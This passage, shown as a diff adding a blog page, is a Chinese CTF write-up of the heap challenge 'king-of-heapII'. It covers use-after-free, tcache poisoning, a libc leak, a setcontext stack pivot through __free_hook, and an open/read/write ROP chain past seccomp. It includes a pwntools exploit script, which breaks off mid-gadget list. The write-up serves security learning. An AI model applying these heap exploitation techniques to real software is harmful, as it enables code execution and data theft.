@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>长城杯pwn-king-of-heapII-writeup---记录第一次heap上的orw | HaveYouTall</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="0x00 前情提要这道题我还是做了比较久的，因为一直没有一个连续有空的时间可以将其搞定。所以拖了好久才做完这个题。题目来自第一界长城杯pwn的第二题。 从这个题中我学到了什么呢？  首先就是对堆上的一些概念更加清晰了，感觉glibc-2.27算是入门了。 然后就是学会了如何在堆上做orw（资料显示，2.29及其之前都可以通过setcontext来做栈迁移，然后ROP） 最后就是如何用ROPgadg">
+<meta property="og:type" content="article">
+<meta property="og:title" content="长城杯pwn-king-of-heapII-writeup---记录第一次heap上的orw">
+<meta property="og:url" content="https://haveyoutall.github.io/2021/09/28/king-of-heap2-orw-glibc-2.27/index.html">
+<meta property="og:site_name" content="HaveYouTall">
+<meta property="og:description" content="0x00 前情提要这道题我还是做了比较久的，因为一直没有一个连续有空的时间可以将其搞定。所以拖了好久才做完这个题。题目来自第一界长城杯pwn的第二题。 从这个题中我学到了什么呢？  首先就是对堆上的一些概念更加清晰了，感觉glibc-2.27算是入门了。 然后就是学会了如何在堆上做orw（资料显示，2.29及其之前都可以通过setcontext来做栈迁移，然后ROP） 最后就是如何用ROPgadg">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://haveyoutall.github.io/2021/09/28/king-of-heap2-orw-glibc-2.27/king-of-heap2-orw-glibc-2.27%5Cimage-20210928165154363.png">
+<meta property="og:image" content="https://haveyoutall.github.io/2021/09/28/king-of-heap2-orw-glibc-2.27/king-of-heap2-orw-glibc-2.27%5Cimage-20210928165154363.png">
+<meta property="article:published_time" content="2021-09-28T07:35:33.193Z">
+<meta property="article:modified_time" content="2021-09-28T11:06:52.737Z">
+<meta property="article:author" content="HaveYouTall">
+<meta property="article:tag" content="ctf-pwn">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="glibc-2.27">
+<meta property="article:tag" content="orw">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://haveyoutall.github.io/2021/09/28/king-of-heap2-orw-glibc-2.27/king-of-heap2-orw-glibc-2.27%5Cimage-20210928165154363.png">
+  
+    <link rel="alternative" href="/atom.xml" title="HaveYouTall" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/Wallpaper.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">HaveYouTall</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Binary | Blockchain | Crypto</p>
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签分类</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/HaveYouTall" title="github">github</a>
+                            
+                                <a class="fl twitter" target="_blank" href="https://twitter.com/HaveYouTall" title="twitter">twitter</a>
+                            
+                                <a class="fl zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Ubuntu16/" style="font-size: 13.33px;">Ubuntu16</a> <a href="/tags/Ubuntu18/" style="font-size: 10px;">Ubuntu18</a> <a href="/tags/ctf-pwn/" style="font-size: 20px;">ctf-pwn</a> <a href="/tags/ctf-tools/" style="font-size: 16.67px;">ctf-tools</a> <a href="/tags/gdb/" style="font-size: 10px;">gdb</a> <a href="/tags/glibc-2-27/" style="font-size: 10px;">glibc-2.27</a> <a href="/tags/gnuradio/" style="font-size: 10px;">gnuradio</a> <a href="/tags/heap/" style="font-size: 13.33px;">heap</a> <a href="/tags/one-gadget/" style="font-size: 10px;">one_gadget</a> <a href="/tags/orw/" style="font-size: 10px;">orw</a> <a href="/tags/pip/" style="font-size: 10px;">pip</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/ret2text/" style="font-size: 10px;">ret2text</a> <a href="/tags/stack/" style="font-size: 16.67px;">stack</a> <a href="/tags/wireless-security/" style="font-size: 10px;">wireless security</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://luuman.github.io/">powered by luuman</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">A rookie who are intrested in binary &amp; blockchain &amp; crypto.</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">HaveYouTall</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/Wallpaper.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">HaveYouTall</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Binary | Blockchain | Crypto</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签分类</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/HaveYouTall" title="github">github</a>
+                    
+                        <a class="twitter" target="_blank" href="https://twitter.com/HaveYouTall" title="twitter">twitter</a>
+                    
+                        <a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-king-of-heap2-orw-glibc-2.27" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/28/king-of-heap2-orw-glibc-2.27/" class="article-date">
+      <time datetime="2021-09-28T07:35:33.193Z" itemprop="datePublished">2021-09-28</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      长城杯pwn-king-of-heapII-writeup---记录第一次heap上的orw
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/ctf/">ctf</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf-pwn/" rel="tag">ctf-pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/glibc-2-27/" rel="tag">glibc-2.27</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/orw/" rel="tag">orw</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="0x00-前情提要"><a href="#0x00-前情提要" class="headerlink" title="0x00 前情提要"></a>0x00 前情提要</h2><p>这道题我还是做了比较久的，因为一直没有一个连续有空的时间可以将其搞定。所以拖了好久才做完这个题。题目来自第一界长城杯pwn的第二题。</p>
+<p><strong>从这个题中我学到了什么呢</strong>？</p>
+<ul>
+<li>首先就是对堆上的一些概念更加清晰了，感觉glibc-2.27算是入门了。</li>
+<li>然后就是学会了如何在堆上做orw（资料显示，2.29及其之前都可以通过setcontext来做栈迁移，然后ROP）</li>
+<li>最后就是如何用ROPgadget 找到<code>syscall ; ret</code>。（因为直接ROPgadget居然找不到这个gadget）</li>
+</ul>
+<span id="more"></span>
+
+<h2 id="0x01-简要的程序分析"><a href="#0x01-简要的程序分析" class="headerlink" title="0x01 简要的程序分析"></a>0x01 简要的程序分析</h2><p>分析的部分很简单，这里就不赘述了。简单总结一下漏洞。如果需要可以自己去找题目然后看看。</p>
+<p>这个题目的漏洞就是很简单的UAF，在free的时候没有把指针清空掉。</p>
+<p>这个题目要注意的一个点是，最大申请的堆块大小只能是0x60。</p>
+<p>所以我们可以做好多事情，leak很多东西。</p>
+<h2 id="0x02-Leak-Libc"><a href="#0x02-Leak-Libc" class="headerlink" title="0x02 Leak Libc"></a>0x02 Leak Libc</h2><p>在程序的开头可以看到调用了seccomp函数，启动了沙箱，禁用了59号系统调用（execve），所以就不能直接来使用onegadget来getshell了。</p>
+<p>那么自然而然，我们需要考虑orw了。</p>
+<p>之前做过栈上的orw，这次是第一次做堆，那么问题的难点肯定就是怎么把栈搬到我们能控制的地方。也就是说，我们可以往这个栈里面写东西。（因为ROP显然是跟着栈的rsp来执行的）</p>
+<p>既然要ROP，首先肯定得有libc。</p>
+<p>所以要leak libc</p>
+<ul>
+<li><p><strong>那么怎么leak呢？</strong></p>
+<p>首先我们有UAF，然后还有这个程序有show函数功能，那么如果我们可以free一个块到unsorted bin里面，我们就可以拿到main_arena + 88 的地址了，进而可以拿到libc基址。</p>
+</li>
+<li><p><strong>所以现在的问题就是怎么free到unsorted bin里？</strong></p>
+<p>由于我们不能有大于0x60的malloc，所以我们只能通过修改size位，假装它是一个大的size。</p>
+</li>
+<li><p><strong>这个操作的难点是如何能够修改到size位。</strong></p>
+<p>这时候就要用到UAF了，因为我们free之后仍然可以修改堆块，所以里面的fd指针是可以修改的。</p>
+<p>如果我们可以将其改成后一个堆块+0x10的地址，我们再malloc出来的那个堆块就相当于囊括了其下一个堆块的size位。</p>
+<p>例如，有如下堆块布局，先free 2再free1，则tcache里面内容为 tcache-&gt;1-&gt;2。</p>
+<p>这个时候修改堆块1的fd的值为0x555640，然后再往堆块2里面写0x60的内容，这样最后0x10的内容就是堆块3的size位了，也就是0x5556a0开始的0x10个字节。</p>
+<p><img src="/2021/09/28/king-of-heap2-orw-glibc-2.27/king-of-heap2-orw-glibc-2.27%5Cimage-20210928165154363.png" alt="image-20210928165154363"></p>
+<blockquote>
+<p>Note: <strong>由于2.27里面有tcache，所以其实修改fd很简单，不需要往修改后地址里面伪造size，因为这个只有再fastbin里面才有检查分配出来的堆块地址的size位。</strong></p>
+</blockquote>
+</li>
+<li><p><strong>修改size位之后，free成unsorted bin的注意事项</strong></p>
+<p>因为把size位改了之后，后面的部分会被free成一体，就会影响top chunk，影响后面的分配。</p>
+<p>因此在修改size之前，后面其实需要有足够多的chunk，使得其加上0x70大小正好是修改后的大小。</p>
+<blockquote>
+<p>足够多的chunk是指，后面堆块大小加上0x70要正好是修改后的size大小，在这个前提下，后面可以再多分配一点堆块没问题，并且一定要多有一个，为了防止free的时候跟top chunk合并了。因为如果这个大小与堆块的开头不对齐的话，top chunk还是会出错。</p>
+</blockquote>
+</li>
+<li><p><strong>Leak Libc</strong></p>
+<p>在搞定了unsorted bin之后，我们就饿可以直接free掉这个堆块，此时这个堆块的指针依然没有清空，所以当我们调用show功能的时候，就能输出main_arena的值了。</p>
+</li>
+</ul>
+<h2 id="0x03-栈迁移"><a href="#0x03-栈迁移" class="headerlink" title="0x03 栈迁移"></a>0x03 栈迁移</h2><p>有了libc之后，我们就有了gadget的相应真实地址。</p>
+<p>那么现在问题就转到了如何构造ROP 链。</p>
+<p>由于我们现在可以去写和修改堆里面的内容，但是不能对栈做操作，因此如果我们把rsp指到堆上来，那问题就解决了。</p>
+<p>所以要实现这个目标，我们就必须要指导堆的地址才行。</p>
+<p><strong>因此我们要 Leak Chunk Address。</strong></p>
+<p>这个leak比libc简单多了，因为我们的chunk全是tcache中的，其实就是直接free掉堆块，然后再调用输出功能，输出其fd的值即可。</p>
+<p><strong>setcontext</strong></p>
+<p>有了ROP 链的地址之后，我们就可以去做栈迁移了，这个地方的迁移就用setcontext来做。</p>
+<p>因为2.29之前，setcontext会根据rdi的值，来修改rsp等寄存器的内容，因此可以利用来改变栈的位置。</p>
+<p>setcontext源码如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class="line">&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">&lt;setcontext+94&gt;:  push   rcx</span><br><span class="line">&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class="line">&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">&lt;setcontext+125&gt;: xor    eax,eax</span><br><span class="line">&lt;setcontext+127&gt;: ret  </span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里面跟栈有关的操作是mov rsp和后面的push rcx。</p>
+<p>首先是把rsp的值变为rdi + 0xa0这个地址里的内容，然后是把rcx变为rdi + 0xa8这个地址里的内容。</p>
+<p>然后会把rcx再push到栈上。</p>
+<p>所以总的来讲就是，我们可以通过改变rdi + 0xa0的值，指定rsp最后的位置，也就是我们ROP链所写入的地方。然后控制rdi + 0xa8的值，让其中的内容位ROP链的开头gadget（因为rcx最后被push进栈了，所以栈里原来部署好的ROP链应该是去掉最开头的8个字节gadget的部分）。</p>
+<h2 id="0x04-构思ROP"><a href="#0x04-构思ROP" class="headerlink" title="0x04 构思ROP"></a>0x04 构思ROP</h2><p>有了上面的一些准备和思路之后，我们就可以构思如下的操作：</p>
+<ul>
+<li><p>先往堆块中写入ROP链（除了第一个gadget），然后读出这个chunk的地址。</p>
+</li>
+<li><p>然后分配合理的空间（2个chunk，一个0x70大小记为A，一个0x50大小，大小均包括head部分）。这样A chunk的地址到最后0x10个字节的时候，中间正好差了0xa0。因此A chunk的地址可以作为rdi，然后最后0x10的内容为我们控制的应该有的内容（ROP链地址和ROP链头部gadget）。</p>
+</li>
+<li><p>然后利用UAF，将__free_hook的内容改为setcontext+53的地址。</p>
+</li>
+<li><p>最后free掉A块，此时就是rdi为A的地址，然后free的时候进入__free_hook，相当于调用setcontext函数，并且给了rdi值为A的地址。然后就成功地进入了我们构造好的ROP链里。</p>
+</li>
+</ul>
+<h2 id="0x05-EXP"><a href="#0x05-EXP" class="headerlink" title="0x05 EXP"></a>0x05 EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;&gt;&gt; \n&quot;</span>)</span><br><span class="line">	r.send(<span class="string">&quot;1\n&quot;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;input index:\n&quot;</span>)</span><br><span class="line">	r.send(<span class="built_in">str</span>(idx) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;input size:\n&quot;</span>)</span><br><span class="line">	r.send(<span class="built_in">str</span>(size) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;&gt;&gt; \n&quot;</span>)</span><br><span class="line">	r.send(<span class="string">&quot;2\n&quot;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;input index:\n&quot;</span>)</span><br><span class="line">	r.send(<span class="built_in">str</span>(idx) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,context</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;&gt;&gt; \n&quot;</span>)</span><br><span class="line">	r.send(<span class="string">&quot;3\n&quot;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;input index:\n&quot;</span>)</span><br><span class="line">	r.send(<span class="built_in">str</span>(idx) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;input context:\n&quot;</span>)</span><br><span class="line">	r.send(context)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;&gt;&gt; \n&quot;</span>)</span><br><span class="line">	r.send(<span class="string">&quot;4\n&quot;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;input index:\n&quot;</span>)</span><br><span class="line">	r.send(<span class="built_in">str</span>(idx) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">	gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">r = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clean up bin</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x20</span>) <span class="comment"># cou chu 0x421, prevent top chunk error</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	add(<span class="number">14</span>,<span class="number">0x60</span>) <span class="comment"># cou chu 0x421, prevent top chunk error</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x10</span>) <span class="comment"># dian yi xia</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;\x40&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">p = <span class="string">&quot;a&quot;</span>*<span class="number">0x30</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>)</span><br><span class="line">edit(<span class="number">1</span>,p)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - (<span class="number">0x7f79421bcca0</span> - <span class="number">0x7f7941dd1000</span>)</span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#for i in range():</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>) <span class="comment"># flag write addr</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>) <span class="comment"># fake stack for rop</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>)</span><br><span class="line"><span class="comment">#add(7,0x60)</span></span><br><span class="line"><span class="comment">#delete(7)</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">flag_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;flag_addr:&quot;</span> + <span class="built_in">hex</span>(flag_addr))</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">fake_stack_addr1 = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;fake_stack_addr:&quot;</span> + <span class="built_in">hex</span>(fake_stack_addr1))</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">fake_stack_addr2 = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;fake_stack_addr:&quot;</span> + <span class="built_in">hex</span>(fake_stack_addr2))</span><br><span class="line"><span class="comment">#show(6)</span></span><br><span class="line"><span class="comment">#fake_stack_addr3 = u64(r.recv(6).ljust(8,&quot;\x00&quot;))</span></span><br><span class="line"><span class="comment">#success(&quot;fake_stack_addr:&quot; + hex(fake_stack_addr3))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set_context = libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + libc_base + <span class="number">53</span></span><br><span class="line">free_hook = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>] + libc_base</span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">pop_rdi = <span class="number">0x215bf</span> + libc_base <span class="comment">#: pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x23eea</span> + libc_base <span class="comment">#: pop rsi ; ret</span></span><br><span class="line">pop_rdx = <span class="number">0x1b96</span> + libc_base 